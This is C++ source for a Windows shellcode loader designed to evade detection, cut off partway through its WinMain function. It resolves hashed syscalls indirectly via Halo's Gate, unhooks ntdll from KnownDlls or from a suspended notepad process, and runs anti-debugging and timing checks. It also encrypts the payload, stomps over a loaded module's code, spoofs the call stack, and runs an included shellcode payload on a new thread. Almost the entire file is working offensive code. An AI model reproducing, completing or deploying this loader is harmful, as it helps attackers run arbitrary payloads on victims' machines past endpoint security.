#include <windows.h>
#include <winternl.h>
#include <intrin.h>
#include <stdio.h>
#include "ntstructs.h"
#include "syscalls.h"
#include "obfuscation.h"

#pragma comment(lib, "ntdll.lib")

// Compiler generates memset for struct = {0} initializations
// Must provide with C linkage for linker to resolve
#pragma function(memset)
extern "C" void* __cdecl memset(void* dst, int val, size_t sz) {
    unsigned char* p = (unsigned char*)dst;
    while (sz--) *p++ = (unsigned char)val;
    return dst;
}


#define CFG_UNHOOK      1
#define CFG_ANTIDEBUG   1
#define CFG_DELAY       1
#define CFG_SPOOF       1
#define CFG_STOMP       1
#define CFG_DEBUG       0

#if CFG_DEBUG
FILE* g_dbgfile = nullptr;
void InitDbg() {
    fopen_s(&g_dbgfile, "debug.log", "w");
}
void CloseDbg() {
    if (g_dbgfile) { fflush(g_dbgfile); fclose(g_dbgfile); }
}
#define DBG(fmt, ...) if (g_dbgfile) { fprintf(g_dbgfile, "[DBG] " fmt "\n", ##__VA_ARGS__); fflush(g_dbgfile); }
#else
#define DBG(fmt, ...) ((void)0)
inline void InitDbg() {}
inline void CloseDbg() {}
#endif

__forceinline void VolatileZero(void* ptr, size_t sz) {
    volatile char* p = (volatile char*)ptr;
    while (sz--) *p++ = 0;
}
// CRT replacements to avoid msvcrt dependency (OPSEC: smaller import table)
__forceinline void* MemSet(void* dst, int val, size_t sz) {
    unsigned char* p = (unsigned char*)dst;
    while (sz--) *p++ = (unsigned char)val;
    return dst;
}

__forceinline size_t WcsLen(const wchar_t* s) {
    size_t len = 0;
    while (*s++) len++;
    return len;
}

// Redirect standard calls to our implementations
#define wcslen WcsLen


__forceinline int WcsCmpI(const wchar_t* a, const wchar_t* b) {
    while (*a && *b) {
        wchar_t ca = (*a >= L'A' && *a <= L'Z') ? *a + 32 : *a;
        wchar_t cb = (*b >= L'A' && *b <= L'Z') ? *b + 32 : *b;
        if (ca != cb) return ca - cb;
        a++; b++;
    }
    return *a - *b;
}

__forceinline int MemCmp(const void* a, const void* b, size_t n) {
    const unsigned char* pa = (const unsigned char*)a;
    const unsigned char* pb = (const unsigned char*)b;
    while (n--) { if (*pa != *pb) return *pa - *pb; pa++; pb++; }
    return 0;
}

__forceinline void MemCpy(void* dst, const void* src, size_t n) {
    char* d = (char*)dst;
    const char* s = (const char*)src;
    while (n--) *d++ = *s++;
}

struct SyscallInfo { uint32_t hash; uint32_t ssn; PVOID gadget; };
static SyscallInfo g_Sys[20] = {};
static uint32_t g_SysCount = 0;
static PVOID g_Gadget = nullptr;

__forceinline PPEB GetPEB() {
#ifdef _WIN64
    return (PPEB)__readgsqword(0x60);
#else
    return (PPEB)__readfsdword(0x30);
#endif
}

PVOID GetModule(uint32_t hash) {
    PPEB peb = GetPEB();
    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    for (PLIST_ENTRY e = head->Flink; e != head; e = e->Flink) {
        auto mod = CONTAINING_RECORD(e, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (mod->BaseDllName.Buffer && mod->DllBase) {
            char name[128] = {};
            int len = mod->BaseDllName.Length / sizeof(WCHAR);
            for (int i = 0; i < len && i < 127; ++i) {
                char c = (char)mod->BaseDllName.Buffer[i];
                name[i] = (c >= 'A' && c <= 'Z') ? c + 32 : c;
            }
            if (HashDjb2RT(name) == hash) return mod->DllBase;
        }
    }
    return nullptr;
}

PVOID GetExport(PVOID base, uint32_t hash) {
    if (!base) return nullptr;
    auto dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;
    auto nt = (PIMAGE_NT_HEADERS)((PBYTE)base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;
    auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir.VirtualAddress) return nullptr;
    auto exp = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)base + dir.VirtualAddress);
    auto names = (PDWORD)((PBYTE)base + exp->AddressOfNames);
    auto funcs = (PDWORD)((PBYTE)base + exp->AddressOfFunctions);
    auto ords = (PWORD)((PBYTE)base + exp->AddressOfNameOrdinals);
    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        auto name = (const char*)((PBYTE)base + names[i]);
        if (HashDjb2RT(name) == hash) {
            DWORD rva = funcs[ords[i]];
            if (rva >= dir.VirtualAddress && rva < dir.VirtualAddress + dir.Size) continue;
            return (PBYTE)base + rva;
        }
    }
    return nullptr;
}

// ".text" obfuscated: each char XOR'd with 0x77
static const char g_TextSection[6] = { '.' ^ 0x77, 't' ^ 0x77, 'e' ^ 0x77, 'x' ^ 0x77, 't' ^ 0x77, 0 };
__forceinline bool IsTextSection(const char* name) {
    for (int i = 0; i < 5; ++i) if (name[i] != (g_TextSection[i] ^ 0x77)) return false;
    return true;
}

bool GetTextBounds(PVOID mod, PBYTE* start, PBYTE* end) {
    auto dos = (PIMAGE_DOS_HEADER)mod;
    auto nt = (PIMAGE_NT_HEADERS)((PBYTE)mod + dos->e_lfanew);
    auto sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (IsTextSection((const char*)sec[i].Name) || (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) {
            *start = (PBYTE)mod + sec[i].VirtualAddress;
            *end = *start + sec[i].Misc.VirtualSize;
            return true;
        }
    }
    return false;
}

constexpr BYTE STUB_SIG[] = { 0x4C, 0x8B, 0xD1, 0xB8 };

bool IsClean(PBYTE p) { return MemCmp(p, STUB_SIG, 4) == 0; }
uint32_t GetSSN(PBYTE p) { return IsClean(p) ? *(uint32_t*)(p + 4) : UINT32_MAX; }

int FindStubOffset(PBYTE stub, PBYTE secStart, PBYTE secEnd) {
    static const int offsets[] = { 32, 48, 64 };
    for (int oi = 0; oi < 3; ++oi) {
        int off = offsets[oi];
        int found = 0;
        for (int dir = -1; dir <= 1; dir += 2) {
            for (int i = 1; i <= 3; ++i) {
                PBYTE p = stub + (dir * i * off);
                if (p >= secStart && p < secEnd - 8 && IsClean(p)) found++;
            }
        }
        if (found >= 2) return off;
    }
    return 32;
}

uint32_t HalosGate(PBYTE stub, PVOID ntdll) {
    uint32_t direct = GetSSN(stub);
    if (direct != UINT32_MAX) return direct;
    PBYTE secStart, secEnd;
    if (!GetTextBounds(ntdll, &secStart, &secEnd)) return UINT32_MAX;
    int off = FindStubOffset(stub, secStart, secEnd);
    for (int i = 1; i <= 25; ++i) {
        PBYTE p = stub - (i * off);
        if (p >= secStart && IsClean(p)) {
            uint32_t ssn = GetSSN(p);
            if (ssn != UINT32_MAX && ssn + i < 0x1000) return ssn + i;
        }
    }
    for (int i = 1; i <= 25; ++i) {
        PBYTE p = stub + (i * off);
        if (p < secEnd - 8 && IsClean(p)) {
            uint32_t ssn = GetSSN(p);
            if (ssn != UINT32_MAX && ssn >= (uint32_t)i) return ssn - i;
        }
    }
    return UINT32_MAX;
}

PVOID FindGadget(PVOID mod) {
    PBYTE start, end;
    if (!GetTextBounds(mod, &start, &end)) return nullptr;
    for (PBYTE p = start; p < end - 3; ++p)
        if (p[0] == 0x0F && p[1] == 0x05 && p[2] == 0xC3) return p;
    return nullptr;
}

SyscallInfo* GetSys(uint32_t h) {
    for (uint32_t i = 0; i < g_SysCount; ++i)
        if (g_Sys[i].hash == h) return &g_Sys[i];
    return nullptr;
}

bool InitSyscalls() {
    DBG("InitSyscalls()");
    PVOID ntdll = GetModule(Hashes::NTDLL);
    if (!ntdll) { DBG("  ntdll not found"); return false; }
    DBG("  ntdll @ %p", ntdll);
    g_Gadget = FindGadget(ntdll);
    if (!g_Gadget) { DBG("  gadget not found"); return false; }
    DBG("  gadget @ %p", g_Gadget);
    uint32_t targets[] = {
        Hashes::NtAllocateVirtualMemory, Hashes::NtProtectVirtualMemory,
        Hashes::NtCreateThreadEx, Hashes::NtWaitForSingleObject,
        Hashes::NtClose, Hashes::NtFreeVirtualMemory,
        Hashes::NtQueryInformationProcess, Hashes::NtOpenSection,
        Hashes::NtMapViewOfSection, Hashes::NtUnmapViewOfSection,
        Hashes::NtReadVirtualMemory, Hashes::NtTerminateProcess,
        Hashes::NtDelayExecution
    };
    g_SysCount = 0;
    for (uint32_t h : targets) {
        PBYTE fn = (PBYTE)GetExport(ntdll, h);
        if (!fn) continue;
        uint32_t ssn = HalosGate(fn, ntdll);
        if (ssn == UINT32_MAX) continue;
        g_Sys[g_SysCount++] = { h, ssn, g_Gadget };
    }
    DBG("  resolved %u syscalls", g_SysCount);
    return g_SysCount >= 8;
}

void SysClose(HANDLE h) {
    if (!h || h == INVALID_HANDLE_VALUE) return;
    auto s = GetSys(Hashes::NtClose);
    if (s) SysNtClose(s->gadget, s->ssn, h);
}

PVOID SysAlloc(SIZE_T sz, ULONG prot) {
    auto s = GetSys(Hashes::NtAllocateVirtualMemory);
    if (!s) return nullptr;
    PVOID base = nullptr;
    SIZE_T size = sz;
    if (NT_SUCCESS(SysNtAllocateVirtualMemory(s->gadget, s->ssn, GetCurrentProcess(), &base, 0, &size, MEM_COMMIT | MEM_RESERVE, prot)))
        return base;
    return nullptr;
}

void SysFree(PVOID* p, SIZE_T sz, bool secure) {
    if (!*p) return;
    PVOID base = *p;
    *p = nullptr;
    if (secure && sz) VolatileZero(base, sz);
    auto s = GetSys(Hashes::NtFreeVirtualMemory);
    if (s) { SIZE_T fsz = 0; SysNtFreeVirtualMemory(s->gadget, s->ssn, GetCurrentProcess(), &base, &fsz, MEM_RELEASE); }
}

bool SysProtect(PVOID addr, SIZE_T sz, ULONG prot, ULONG* old) {
    auto s = GetSys(Hashes::NtProtectVirtualMemory);
    if (!s) return false;
    PVOID b = addr; SIZE_T ss = sz;
    return NT_SUCCESS(SysNtProtectVirtualMemory(s->gadget, s->ssn, GetCurrentProcess(), &b, &ss, prot, old));
}

bool SysRead(HANDLE proc, PVOID addr, PVOID buf, SIZE_T sz, SIZE_T* br) {
    auto s = GetSys(Hashes::NtReadVirtualMemory);
    if (!s) return false;
    return NT_SUCCESS(SysNtReadVirtualMemory(s->gadget, s->ssn, proc, addr, buf, sz, br));
}

void SysTerminate(HANDLE proc) {
    auto s = GetSys(Hashes::NtTerminateProcess);
    if (s) SysNtTerminateProcess(s->gadget, s->ssn, proc, 0);
}

void SysSleep(DWORD ms) {
    DBG("SysSleep(%lu ms)", ms);
    auto s = GetSys(Hashes::NtDelayExecution);
    if (!s) { DBG("  NtDelayExecution not found, skipping"); return; }
    LARGE_INTEGER li;
    li.QuadPart = -((LONGLONG)ms * 10000);
    DBG("  Calling NtDelayExecution via gadget %p with ssn %d", s->gadget, s->ssn);
    SysNtDelayExecution(s->gadget, s->ssn, FALSE, &li);
    DBG("  Sleep complete");
}

#if CFG_DELAY
void Delay() { SysSleep(30 + (GetTickCount() ^ GetCurrentProcessId()) % 150); }
#else
#define Delay() ((void)0)
#endif

#if CFG_UNHOOK
bool UnhookKnownDlls() {
    DBG("    UnhookKnownDlls()");
    auto sO = GetSys(Hashes::NtOpenSection);
    auto sM = GetSys(Hashes::NtMapViewOfSection);
    auto sU = GetSys(Hashes::NtUnmapViewOfSection);
    if (!sO || !sM || !sU) { DBG("      Missing syscall handles"); return false; }
    DBG("      Got syscall handles");
    PVOID ntdll = GetModule(Hashes::NTDLL);
    if (!ntdll) { DBG("      ntdll not found"); return false; }
    DECRYPT_WSTR(path, L"\\KnownDlls\\ntdll.dll");
    UNICODE_STRING us = {}; us.Buffer = path;
    us.Length = (USHORT)(wcslen(path) * sizeof(WCHAR));
    us.MaximumLength = us.Length + sizeof(WCHAR);
    OBJECT_ATTRIBUTES oa = { sizeof(oa), nullptr, &us };
    HANDLE hSec = nullptr;
    DBG("      Opening KnownDlls\\ntdll.dll section");
    DBG("      sO gadget=%p ssn=%u", sO->gadget, sO->ssn);
    NTSTATUS st = SysNtOpenSection(sO->gadget, sO->ssn, &hSec, SECTION_MAP_READ, &oa);
    DBG("      NtOpenSection returned");
    CLEAR_STR(path);
    if (!NT_SUCCESS(st)) { DBG("      NtOpenSection failed: 0x%08x", st); return false; }
    DBG("      Section opened, mapping view");
    PVOID view = nullptr; SIZE_T viewSz = 0;
    st = SysNtMapViewOfSection(sM->gadget, sM->ssn, hSec, GetCurrentProcess(), &view, 0, 0, nullptr, &viewSz, 1, 0, PAGE_READONLY);
    if (!NT_SUCCESS(st)) { DBG("      NtMapViewOfSection failed: 0x%08x", st); SysClose(hSec); return false; }
    DBG("      View mapped @ %p (sz %zu)", view, viewSz);
    bool ok = false;
    auto dos = (PIMAGE_DOS_HEADER)view;
    auto nt = (PIMAGE_NT_HEADERS)((PBYTE)view + dos->e_lfanew);
    auto sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (IsTextSection((const char*)sec[i].Name)) {
            PVOID dst = (PBYTE)ntdll + sec[i].VirtualAddress;
            PVOID src = (PBYTE)view + sec[i].VirtualAddress;
            SIZE_T sz = sec[i].Misc.VirtualSize;
            DBG("      Found .text: dst=%p src=%p sz=%zu", dst, src, sz);
            ULONG old;
            if (SysProtect(dst, sz, PAGE_EXECUTE_READWRITE, &old)) {
                MemCpy(dst, src, sz);
                SysProtect(dst, sz, old, &old);
                ok = true;
                DBG("      Copied .text section");
            }
            break;
        }
    }
    SysNtUnmapViewOfSection(sU->gadget, sU->ssn, GetCurrentProcess(), view);
    SysClose(hSec);
    DBG("      UnhookKnownDlls complete (ok=%d)", ok);
    return ok;
}

bool UnhookSuspended() {
    DBG("    UnhookSuspended()");
    PVOID localNtdll = GetModule(Hashes::NTDLL);
    if (!localNtdll) { DBG("      Local ntdll not found"); return false; }
    STARTUPINFOW si = { sizeof(si) }; PROCESS_INFORMATION pi = {};
    DECRYPT_WSTR(cmd, L"notepad.exe");
    DBG("      Creating suspended notepad process");
    BOOL created = CreateProcessW(nullptr, cmd, nullptr, nullptr, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CLEAR_STR(cmd);
    if (!created) { DBG("      CreateProcessW failed"); return false; }
    DBG("      Notepad created: pid=%lu", pi.dwProcessId);
    
    auto sQ = GetSys(Hashes::NtQueryInformationProcess);
    if (!sQ) { DBG("      NtQueryInformationProcess syscall not found"); SysTerminate(pi.hProcess); SysClose(pi.hThread); SysClose(pi.hProcess); return false; }
    PROCESS_BASIC_INFORMATION pbi = {};
    SysNtQueryInformationProcess(sQ->gadget, sQ->ssn, pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), nullptr);
    DBG("      Got PEB @ %p", pbi.PebBaseAddress);
    
    PVOID remoteNtdll = nullptr; SIZE_T br;
    PEB remotePeb = {};
    if (SysRead(pi.hProcess, pbi.PebBaseAddress, &remotePeb, sizeof(remotePeb), &br)) {
        LIST_ENTRY* remoteHead = &((PEB_LDR_DATA*)remotePeb.Ldr)->InMemoryOrderModuleList;
        LIST_ENTRY entry = {};
        if (SysRead(pi.hProcess, remoteHead, &entry, sizeof(entry), &br)) {
            PVOID cur = entry.Flink;
            for (int i = 0; i < 10 && cur != remoteHead; ++i) {
                auto pMod = CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
                LDR_DATA_TABLE_ENTRY me = {};
                if (!SysRead(pi.hProcess, pMod, &me, sizeof(me), &br)) break;
                wchar_t name[64] = {};
                if (me.BaseDllName.Buffer && me.BaseDllName.Length > 0) {
                    SIZE_T nameLen = (me.BaseDllName.Length < sizeof(name) - 2) ? me.BaseDllName.Length : sizeof(name) - 2;
                    SysRead(pi.hProcess, me.BaseDllName.Buffer, name, nameLen, &br);
                    name[nameLen / sizeof(wchar_t)] = L'\0';
                    if (WcsCmpI(name, L"ntdll.dll") == 0) { remoteNtdll = me.DllBase; DBG("      Found remote ntdll @ %p", remoteNtdll); break; }
                }
                LIST_ENTRY e = {};
                if (!SysRead(pi.hProcess, cur, &e, sizeof(e), &br)) break;
                cur = e.Flink;
            }
        }
    }
    bool ok = false;
    if (remoteNtdll) {
        auto dos = (PIMAGE_DOS_HEADER)localNtdll;
        auto nt = (PIMAGE_NT_HEADERS)((PBYTE)localNtdll + dos->e_lfanew);
        auto sec = IMAGE_FIRST_SECTION(nt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
            if (IsTextSection((const char*)sec[i].Name)) {
                SIZE_T sz = sec[i].Misc.VirtualSize;
                PVOID buf = SysAlloc(sz, PAGE_READWRITE);
                if (buf) {
                    PVOID remoteSec = (PBYTE)remoteNtdll + sec[i].VirtualAddress;
                    PVOID localSec = (PBYTE)localNtdll + sec[i].VirtualAddress;
                    DBG("      Reading .text from remote notepad: src=%p sz=%zu", remoteSec, sz);
                    if (SysRead(pi.hProcess, remoteSec, buf, sz, &br) && br == sz) {
                        ULONG old;
                        if (SysProtect(localSec, sz, PAGE_EXECUTE_READWRITE, &old)) {
                            MemCpy(localSec, buf, sz);
                            SysProtect(localSec, sz, old, &old);
                            ok = true;
                            DBG("      .text copied from notepad");
                        }
                    }
                    SysFree(&buf, sz, true);
                }
                break;
            }
        }
    } else {
        DBG("      Remote ntdll not found in notepad");
    }
    
    SysTerminate(pi.hProcess);
    SysClose(pi.hThread);
    SysClose(pi.hProcess);
    DBG("      UnhookSuspended complete (ok=%d)", ok);
    return ok;
}

bool Unhook() { DBG("   Unhook()"); return UnhookKnownDlls() || UnhookSuspended(); }
#endif

#if CFG_ANTIDEBUG
bool CheckPEB() { return GetPEB()->BeingDebugged != 0; }

bool CheckDebugPort() {
    auto s = GetSys(Hashes::NtQueryInformationProcess);
    if (!s) return false;
    HANDLE port = nullptr;
    NTSTATUS st = SysNtQueryInformationProcess(s->gadget, s->ssn, GetCurrentProcess(), (PROCESSINFOCLASS)7, &port, sizeof(port), nullptr);
    return NT_SUCCESS(st) && port != nullptr;
}

bool CheckTiming() {
    LARGE_INTEGER freq, start, end;
    if (!QueryPerformanceFrequency(&freq) || freq.QuadPart == 0) return false;
    volatile uint32_t sink = 0;
    double samples[5];
    for (volatile int t = 0; t < 5; ++t) {
        QueryPerformanceCounter(&start);
        volatile uint32_t x = 0x12345678;
        for (volatile int j = 0; j < 50000; ++j) x = (x ^ (x << 13)) ^ (x >> 17) ^ (x << 5);
        sink += x;
        QueryPerformanceCounter(&end);
        samples[t] = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart * 1000.0;
        SysSleep(5);
    }
    (void)sink;
    for (int i = 0; i < 4; ++i)
        for (int j = i + 1; j < 5; ++j)
            if (samples[i] > samples[j]) { double tmp = samples[i]; samples[i] = samples[j]; samples[j] = tmp; }
    return samples[2] > 100.0;
}

bool IsAnalyzed() { return CheckPEB() || CheckDebugPort() || CheckTiming(); }
#endif

#if CFG_SPOOF
#define STUB_MIN_SIZE 32
void BuildSpoofStub(PBYTE p, PVOID target, SIZE_T maxSz) {
    if (maxSz < STUB_MIN_SIZE) return;
    int i = 0;
    p[i++] = 0x55;
    p[i++] = 0x48; p[i++] = 0x89; p[i++] = 0xE5;
    p[i++] = 0x48; p[i++] = 0x83; p[i++] = 0xEC; p[i++] = 0x20;
    p[i++] = 0x48; p[i++] = 0xB8;
    *(uint64_t*)(p + i) = (uint64_t)target; i += 8;
    p[i++] = 0xFF; p[i++] = 0xD0;
    p[i++] = 0x48; p[i++] = 0x83; p[i++] = 0xC4; p[i++] = 0x20;
    p[i++] = 0x5D;
    p[i++] = 0xC3;
}
#endif

bool ShouldSkip(const char* n) {
    uint32_t h = HashDjb2RT(n);
    return h == Hashes::NTDLL || h == Hashes::KERNEL32 || h == Hashes::KERNELBASE;
}

PVOID FindStompTarget(SIZE_T need) {
    PPEB peb = GetPEB();
    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    bool skipped = false;
    for (PLIST_ENTRY e = head->Flink; e != head; e = e->Flink) {
        auto mod = CONTAINING_RECORD(e, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (!mod->DllBase || !mod->BaseDllName.Buffer) continue;
        if (!skipped) { skipped = true; continue; }
        char name[128] = {};
        int len = mod->BaseDllName.Length / sizeof(WCHAR);
        for (int i = 0; i < len && i < 127; ++i) {
            char c = (char)mod->BaseDllName.Buffer[i];
            name[i] = (c >= 'A' && c <= 'Z') ? c + 32 : c;
        }
        if (ShouldSkip(name)) continue;
        auto dos = (PIMAGE_DOS_HEADER)mod->DllBase;
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) continue;
        auto nt = (PIMAGE_NT_HEADERS)((PBYTE)mod->DllBase + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) continue;
        auto sec = IMAGE_FIRST_SECTION(nt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i)
            if ((sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && sec[i].Misc.VirtualSize >= need)
                return (PBYTE)mod->DllBase + sec[i].VirtualAddress;
    }
    return nullptr;
}

void Crypt(PBYTE d, SIZE_T sz, uint32_t k) {
    uint32_t s = k;
    for (SIZE_T i = 0; i < sz; ++i) { 
        s ^= (s << 13) & 0xFFFFFFFF; 
        s ^= (s >> 17); 
        s ^= (s << 5) & 0xFFFFFFFF; 
        d[i] ^= (BYTE)s; 
    }
}

uint32_t GenKey() {
    uint32_t k = (uint32_t)__rdtsc();
    k ^= GetCurrentProcessId();
    k ^= GetTickCount();
    k ^= (uint32_t)(uintptr_t)&k;
    return k ? k : 0xDEADBEEF;
}

class Loader {
    PBYTE m_enc = nullptr;
    SIZE_T m_sz = 0;
    uint32_t m_key = 0;
    PVOID m_exec = nullptr;
    bool m_execOwned = false;
    PBYTE m_backup = nullptr;
    PVOID m_target = nullptr;
    SIZE_T m_backupSz = 0;
    PVOID m_stub = nullptr;
    SIZE_T m_stubSz = 0;
    HANDLE m_thread = nullptr;
    bool m_init = false;

    void Restore() {
        if (m_backup && m_target && m_backupSz) {
            ULONG old;
            if (SysProtect(m_target, m_backupSz, PAGE_EXECUTE_READWRITE, &old)) {
                MemCpy(m_target, m_backup, m_backupSz);
                SysProtect(m_target, m_backupSz, old, &old);
            }
            SysFree((PVOID*)&m_backup, m_backupSz, false);
            m_target = nullptr; m_backupSz = 0;
        }
    }

public:
    ~Loader() { Cleanup(); }

    void Cleanup() {
        if (m_thread) { SysClose(m_thread); m_thread = nullptr; }
        Restore();
        if (m_stub) { SysFree(&m_stub, m_stubSz, true); m_stubSz = 0; }
        if (m_exec && m_execOwned) SysFree(&m_exec, m_sz, true);
        m_exec = nullptr; m_execOwned = false;
        if (m_enc) SysFree((PVOID*)&m_enc, m_sz, true);
        m_sz = 0; m_init = false;
    }

    bool Init(PBYTE sc, SIZE_T sz) {
        DBG("Loader::Init() sz=%zu", sz);
        m_sz = sz; 
        m_key = GenKey();
        DBG("  Generated key: 0x%x", m_key);
        m_enc = (PBYTE)SysAlloc(sz, PAGE_READWRITE);
        if (!m_enc) { DBG("  SysAlloc failed"); return false; }
        DBG("  Allocated encrypted buffer @ %p", m_enc);
        MemCpy(m_enc, sc, sz);
        DBG("  Copied shellcode, first 8 bytes: %02x %02x %02x %02x %02x %02x %02x %02x",
            m_enc[0], m_enc[1], m_enc[2], m_enc[3], m_enc[4], m_enc[5], m_enc[6], m_enc[7]);
        Crypt(m_enc, sz, m_key);
        DBG("  Encrypted, first 8 bytes now: %02x %02x %02x %02x %02x %02x %02x %02x",
            m_enc[0], m_enc[1], m_enc[2], m_enc[3], m_enc[4], m_enc[5], m_enc[6], m_enc[7]);
        VolatileZero(sc, sz);
        m_init = true;
        DBG("Init complete");
        return true;
    }

    bool Prepare() {
        DBG("Loader::Prepare()");
        if (!InitSyscalls()) { DBG("  InitSyscalls failed"); return false; }
        DBG("  InitSyscalls OK");
        Delay();
#if CFG_UNHOOK
        DBG("  Attempting unhook");
        if (Unhook()) { 
            DBG("    Unhook succeeded, re-initializing syscalls");
            Delay(); 
            if (!InitSyscalls()) { DBG("    Re-init failed"); return false; }
            DBG("    Re-init OK");
        }
        Delay();
#endif
        DBG("Prepare complete");
        return true;
    }

    bool Execute() {
        DBG("Loader::Execute()");
        if (!m_init) { DBG("  Not initialized"); return false; }
#if CFG_ANTIDEBUG
        if (IsAnalyzed()) { DBG("  Debugger/analyzer detected"); Cleanup(); return false; }
#endif
        DBG("  Allocating decryption buffer");
        PVOID dec = SysAlloc(m_sz, PAGE_READWRITE);
        if (!dec) { DBG("  Failed to allocate dec"); return false; }
        DBG("  Decryption buffer @ %p", dec);
        
        MemCpy(dec, m_enc, m_sz);
        DBG("  Copied encrypted shellcode");
        Crypt((PBYTE)dec, m_sz, m_key);
        DBG("  Decrypted, first 8 bytes: %02x %02x %02x %02x %02x %02x %02x %02x",
            ((PBYTE)dec)[0], ((PBYTE)dec)[1], ((PBYTE)dec)[2], ((PBYTE)dec)[3],
            ((PBYTE)dec)[4], ((PBYTE)dec)[5], ((PBYTE)dec)[6], ((PBYTE)dec)[7]);
        
        PVOID target = FindStompTarget(m_sz);
        bool stomped = false;
        if (target) {
            DBG("  Found stomp target @ %p", target);
            m_backup = (PBYTE)SysAlloc(m_sz, PAGE_READWRITE);
            if (m_backup) {
                MemCpy(m_backup, target, m_sz);
                m_target = target; m_backupSz = m_sz;
                ULONG old;
                if (SysProtect(target, m_sz, PAGE_READWRITE, &old)) {
                    MemCpy(target, dec, m_sz);
                    if (SysProtect(target, m_sz, PAGE_EXECUTE_READWRITE, &old)) {
                        m_exec = target; m_execOwned = false; stomped = true;
                        DBG("    Stomped and protected");
                    }
                }
                if (!stomped) { SysFree((PVOID*)&m_backup, m_sz, false); m_target = nullptr; m_backupSz = 0; }
            }
        }
        if (!stomped) {
            DBG("  Using standalone allocation");
            m_exec = SysAlloc(m_sz, PAGE_READWRITE);
            if (!m_exec) { DBG("    Failed to allocate exec"); SysFree(&dec, m_sz, true); return false; }
            MemCpy(m_exec, dec, m_sz);
            ULONG old;
            if (!SysProtect(m_exec, m_sz, PAGE_EXECUTE_READWRITE, &old)) { 
                DBG("    Failed to protect"); 
                SysFree(&m_exec, m_sz, true); SysFree(&dec, m_sz, true); return false; 
            }
            m_execOwned = true;
            DBG("    Standalone allocated and protected @ %p", m_exec);
        }
        SysFree(&dec, m_sz, true);
        
        PVOID entry = m_exec;
        DBG("  Entry point: %p", entry);
#if CFG_SPOOF
        DBG("  Building spoof stub");
        m_stubSz = 64;
        m_stub = SysAlloc(m_stubSz, PAGE_READWRITE);
        if (m_stub) {
            BuildSpoofStub((PBYTE)m_stub, m_exec, m_stubSz);
            ULONG old;
            if (SysProtect(m_stub, m_stubSz, PAGE_EXECUTE_READWRITE, &old)) {
                entry = m_stub;
                DBG("    Spoof stub @ %p (will jump to %p)", m_stub, m_exec);
            }
            else { 
                DBG("    Failed to protect stub, using direct entry");
                SysFree(&m_stub, m_stubSz, true); m_stubSz = 0; 
            }
        }
#endif
        auto sC = GetSys(Hashes::NtCreateThreadEx);
        auto sW = GetSys(Hashes::NtWaitForSingleObject);
        if (!sC || !sW) { DBG("  Missing syscall handles"); return false; }
        
        DBG("  Creating thread @ %p via NtCreateThreadEx", entry);
        NTSTATUS st = SysNtCreateThreadEx(sC->gadget, sC->ssn, &m_thread, THREAD_ALL_ACCESS, nullptr, GetCurrentProcess(), entry, nullptr, 0, 0, 0, 0, nullptr);
        if (!NT_SUCCESS(st) || !m_thread) { 
            DBG("  NtCreateThreadEx failed: 0x%08x", st); 
            m_thread = nullptr; 
            return false; 
        }
        DBG("  Thread created: %p, waiting...", m_thread);
        
        SysNtWaitForSingleObject(sW->gadget, sW->ssn, m_thread, FALSE, nullptr);
        DBG("  Thread completed");
        return true;
    }
};

// Include auto-generated shellcode
#include "shellcode.h"

// Decryption wrapper matching the Crypt() function
__forceinline void DecryptShellcode(uint8_t* data, size_t size, uint32_t key) {
    uint32_t s = key;
    for (size_t i = 0; i < size; ++i) {
        s ^= (s << 13) & 0xFFFFFFFF;
        s ^= (s >> 17);
        s ^= (s << 5) & 0xFFFFFFFF;
        data[i] ^= (uint8_t)s;
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
#if CFG_DEBUG
    InitDbg();
#endif
    
    DBG("=== LOADER START ===");
    DBG("Shellcode size: %d bytes", SHELLCODE_SIZE);
    
    Loader ldr;
    
    DBG("Calling Prepare()");
    if (!ldr.Prepare()) { DBG("Prepare FAILED"); CloseDbg(); return -1; }
    DBG("Prepare OK");
    
    // Create working copy of shellcode
    DBG("Allocating %d bytes for shellcode", SHELLCODE_SIZE);
    PBYTE sc = (PBYTE)SysAlloc(SHELLCODE_SIZE, PAGE_READWRITE);
    if (!sc) { DBG("Alloc FAILED"); CloseDbg(); return -2; }
    DBG("Allocated at %p", sc);
    
    DBG("Copying shellcode");
    MemCpy(sc, shellcode, SHELLCODE_SIZE);
    DBG("First 8 bytes: %02X %02X %02X %02X %02X %02X %02X %02X", 
        sc[0], sc[1], sc[2], sc[3], sc[4], sc[5], sc[6], sc[7]);
    
#ifdef SHELLCODE_KEY
    DBG("Decrypting with key 0x%08X", SHELLCODE_KEY);
    DecryptShellcode(sc, SHELLCODE_SIZE, SHELLCODE_KEY);
    DBG("After decrypt: %02X %02X %02X %02X %02X %02X %02X %02X",
        sc[0], sc[1], sc[2], sc[3], sc[4], sc[5], sc[6], sc[7]);
#else
    DBG("Not encrypted (no SHELLCODE_KEY)");
#endif
    
    // Check if PE
    if (sc[0] == 'M' && sc[1] == 'Z') {
        DBG("PE shellcode detected (MZ header)");
    } else {
        DBG("Raw shellcode (not PE)");
    }
    
    DBG("Calling Init()");
